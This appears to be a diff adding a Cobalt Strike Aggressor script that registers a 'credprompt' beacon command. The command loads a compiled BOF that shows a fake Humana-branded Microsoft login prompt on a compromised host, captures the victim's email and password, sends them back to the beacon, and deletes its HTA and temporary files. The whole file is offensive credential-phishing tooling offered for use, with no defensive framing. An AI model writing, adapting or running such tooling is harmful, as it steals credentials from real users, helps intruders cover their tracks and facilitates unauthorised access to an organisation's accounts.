@@ -1,0 +1,34 @@
+# credprompt - Credential Phishing BOF
+# Displays a Humana-branded login prompt to capture user credentials.
+
+beacon_command_register(
+    "credprompt",
+    "Display a credential phishing prompt to capture user credentials",
+    "Usage:\n" .
+    "   credprompt\n\n" .
+    "Launches a Humana-styled Microsoft login prompt on the target.\n" .
+    "Two-step flow: email input -> password input with slide animation.\n" .
+    "Credentials are returned to the beacon when entered.\n" .
+    "The BOF blocks for up to 2 minutes waiting for input.\n\n" .
+    "The prompt auto-cleans all artifacts (HTA + temp files) on completion.\n"
+);
+
+alias credprompt {
+    local('$bid $barch $handle $data');
+
+    ($bid) = @_;
+
+    # Get architecture and load appropriate BOF
+    $barch  = barch($bid);
+    $handle = openf(script_resource("bin/credprompt. $+ $barch $+ .o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+
+    if (strlen($data) == 0) {
+        berror($bid, "Could not load credprompt BOF for arch: $barch");
+        return;
+    }
+
+    btask($bid, "Launching credential prompt...");
+    beacon_inline_execute($bid, $data, "go", $null);
+}
